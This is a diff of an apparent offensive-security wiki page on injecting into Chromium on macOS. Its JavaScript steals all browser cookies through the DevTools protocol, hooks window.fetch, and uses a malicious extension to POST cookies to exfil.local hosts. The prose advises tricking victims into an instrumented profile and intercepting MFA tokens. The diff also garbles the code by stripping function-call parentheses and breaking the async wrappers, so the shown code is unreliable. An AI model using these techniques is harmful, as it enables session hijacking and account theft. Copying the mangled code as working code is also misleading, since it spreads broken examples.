@@ -1,6 +1,6 @@
 # macOS Chromium Injection
 
-{{#include ../../../banners/hacktricks-training.md}}
+{{#include ../../../banners/this collection-training.md}}
 
 ## Basic Information
 
@@ -47,15 +47,15 @@ Once Chrome is relaunched with a dedicated `--user-data-dir` and `--remote-debug
 ```javascript
 import CDP from 'chrome-remote-interface';
 
-(async () => {
+(async  => {
   const client = await CDP({host: '127.0.0.1', port: 9222});
   const {Network, Runtime} = client;
-  await Network.enable();
-  const {cookies} = await Network.getAllCookies();
+  await Network.enable;
+  const {cookies} = await Network.getAllCookies;
   console.log(cookies.map(c => `${c.domain}:${c.name}`));
   await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
-  await client.close();
-})();
+  await client.close;
+});
 ```
 
 Because Chrome 136 blocks CDP on the default profile, copy/pasting the victim's existing `~/Library/Application Support/Google/Chrome` directory to a staging path no longer yields decrypted cookies. Instead, social-engineer the user into authenticating inside the instrumented profile (e.g., "helpful" support session) or capture MFA tokens in transit via CDP-controlled network hooks.<sup>[[5]](#references)</sup>
@@ -71,8 +71,8 @@ A practical malware pattern is:
 That helper can inject JavaScript **before** site code runs, which is ideal for hooking `window.fetch`, `XMLHttpRequest`, wallet providers, or autofill flows without patching files on disk.<sup>[[3]](#references)</sup>
 
 ```javascript
-await Page.enable();
-await Runtime.enable();
+await Page.enable;
+await Runtime.enable;
 await Page.addScriptToEvaluateOnNewDocument({
   source: `
     const oldFetch = window.fetch;
@@ -100,7 +100,7 @@ Load the extension with `--load-extension`/`--disable-extensions-except` so no u
 ```javascript
 chrome.tabs.onUpdated.addListener((tabId, info) => {
   if (info.status !== 'complete') return;
-  chrome.debugger.attach({tabId}, '1.3', () => {
+  chrome.debugger.attach({tabId}, '1.3',  => {
     chrome.debugger.sendCommand({tabId}, 'Network.enable');
     chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
       fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
@@ -159,4 +159,4 @@ Find more examples in the tools links.
 - [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
 - [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)
 
-{{#include ../../../banners/hacktricks-training.md}}
+{{#include ../../../banners/this collection-training.md}}
